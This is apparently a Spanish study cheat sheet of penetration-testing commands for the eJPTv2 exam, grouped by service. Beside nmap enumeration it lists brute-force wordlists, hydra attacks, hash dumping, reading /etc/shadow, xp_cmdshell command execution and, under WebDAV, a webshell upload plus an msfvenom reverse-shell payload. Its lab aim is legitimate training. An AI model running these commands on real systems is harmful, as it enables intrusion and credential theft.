P# Documentación: Comandos de enumeración

## Descripción
Esta documentación proporciona una introducción básica de los comandos útlices para el examen EJPTv2

### FTP File Transfer Protocol - 21
El Protocolo de Transferencia de Archivos (FTP) es un estándar de red para transferir archivos entre sistemas, operando en el puerto 21. Aunque es antiguo y carece de seguridad, permite cargar y descargar archivos en servidores remotos

```python
nmap -p21 --script ftp-anon IP
wget -m --no-passive ftp://anonymous:anonymous@IP
sudo nmap -sV -p21 -sC -A IP
nc IP 21
```

#### Diccionarios
Lista de palabras para ataques de fuerza bruta

```python
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

### Server Message Block (SMB) - 137,138,139,445
Server Message Block (SMB) es un protocolo de red que facilita el intercambio de archivos, impresoras y recursos entre sistemas. Opera en los puertos 137, 138, 139 y 445. A pesar de su utilidad, el puerto 445 es conocido por vulnerabilidades de seguridad.

```python
smbclient -N -L //IP (list shares)
nmap -sV -sC -p 445 IP
smbclient //IP/notes (connecting shares)
sudo nmap IP -sV -sC -p139,445
rpcclient -U "" IP (srvinfo, enumdomains, querydominfo, netshareenumall, enumdomusers)
smbmap -H IP -u "" -p "" (para revisar que permisos)
smbmap -H IP -u administrator -p smbserver_771 -x 'ipconfig'
smbmap -H IP -u Administrator -p 'smbserver_771' -r 'C$'
smbmap -H IP -u Administrator -p 'smbserver_771' --download 'C$\flag.txt'
crackmapexec smb IP --shares -u '' -p '' (revisar permisos)
./enum4linux-ng.py IP -A
enum4linux -u vagrant -p vagrant -U IP (enumerar usuarios)
nmap -p445 --script smb-protocols IP
nmap -p445 --script smb-security-mode IP
nmap -p445 --script smb-enum-sessions IP
nmap --script smb-os-discovery -p445 IP
enum4linux -r -u "admin" -p "password1" IP (obtener el ssid de los usuarios)
cp /usr/share/doc/python3-impacket/examples/psexec.py /root/Desktop

Tools: 
Psexec - conexión para smb que nos brinda shell
https://github.com/fortra/impacket/blob/master/examples/psexec.py
```

#### Diccionarios
Lista de palabras para ataques de fuerza bruta

```python
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
/usr/share/wordlists/metasploit/unix_passwords.txt
/usr/share/wordlists/metasploit/unix_users.txt
/usr/share/wordlists/rockyou.tx
```

### Secure Shell (SSH) - 22
Secure Shell (SSH) es un protocolo de red seguro que permite la comunicación y el acceso remoto a sistemas mediante el cifrado de datos. Utiliza el puerto 22 para establecer conexiones seguras y autenticadas, garantizando la confidencialidad y la integridad de la información transmitida.

```python
nmap --script ssh2-enum-algos IP
nmap --script ssh-hostkey --script-args ssh_hostkey=full IP
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=student" IP
find / -name "flag" (busca bandera)
```

#### Diccionarios
Lista de palabras para ataques de fuerza bruta

```python
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/common_passwords.txt
```

### HTTP - 80
Hypertext Transfer Protocol (HTTP) es el protocolo estándar de la web para la comunicación entre navegadores y servidores. Opera en el puerto 80, permitiendo la solicitud y transferencia de contenido web, como páginas, imágenes y otros recursos, a través de conexiones no cifradas.

```python
whatweb IP
http IP
dirb http://IP
nmap --script http-headers -sV -p 80 IP
nmap -sV -script banner IP
nmap –script http-enum -sV -p80 IP
nmap –script http-headers -sV -p80 IP
nmap --script http-methods --script-args http-methods.url-path=/webdav/ IP
curl http://IP/
auxiliary/scanner/http/apache_userdir_enum
auxiliary/scanner/http/brute_dirs
auxiliary/scanner/http/dir_scanner
auxiliary/scanner/http/dir_listing
auxiliary/scanner/http/http_put
auxiliary/scanner/http/files_dir
auxiliary/scanner/http/http_login
auxiliary/scanner/http/http_header
auxiliary/scanner/http/http_version
auxiliary/scanner/http/robots_txt
```

#### Diccionarios
Lista de palabras para ataques de fuerza bruta

```python
/usr/share/metasploit-framework/data/wordlists/namelist.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
/usr/share/metasploit-framework/data/wordlists/common_users.txt
```

### MYSQL 3306
MySQL es un sistema de gestión de bases de datos relacional ampliamente utilizado. Utiliza el puerto 3306 para permitir conexiones entre aplicaciones y bases de datos, facilitando el almacenamiento y recuperación eficiente de datos estructurados.

```python
select load_file("/etc/shadow");
mysql -h IP -u root
use auxiliary/scanner/mysql/mysql_hashdump
nmap --script=mysql-empty-password -p 3306 IP
nmap --script=mysql-info -p 3306 IP
nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 IP
nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 IP
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IP mysql
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IP mysql
```

#### Diccionarios
Lista de palabras para ataques de fuerza bruta

```python
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

### MSSQL - 1433
Microsoft SQL Server (MSSQL) es un sistema de gestión de bases de datos relacionales desarrollado por Microsoft. Opera en el puerto 1433, facilitando la comunicación entre aplicaciones y bases de datos, permitiendo el almacenamiento y acceso a datos estructurados, con énfasis en la integración con el ecosistema de Microsoft.

```python
nmap --script ms-sql-info -p 1433 IP
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 IP
nmap -p 1433 --script ms-sql-empty-password IP
nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" IP -oN output.txt
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria IP
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" IP
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" IP
```

#### Diccionarios
Lista de palabras para ataques de fuerza bruta

```python
No hay en este caso
```

### WebDAV - 80/443
WebDAV (Web Distributed Authoring and Versioning) es una extensión del protocolo HTTP que permite la colaboración y la edición remota de archivos en servidores web. Opera en los puertos 80 y 443, posibilitando el acceso y la gestión de archivos a través de conexiones no cifradas (80) y cifradas (443) en entornos seguros.

```python
DavTest (tool) - valida que archivo se puede cargar
Cadaver (tool) - para cargar archivos 
nmap -p80 -sV --script http-enum IP (1)
Open site web (2)
davtest -auth bob:password_123321 -url http://IP/webdav/ (3)
cadaver http://IP/webdav/ (4) - autenticarse
put /usr/share/webshells/asp/webshell.asp (5) - subir la carga shell
more C:\flag.txt
Generar Shell Inverso
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=1234 -f asp > shell.asp
use exploit/multi/handler or listen shell
```

#### Diccionarios
Lista de palabras para ataques de fuerza bruta

```python
No hay en este caso
```
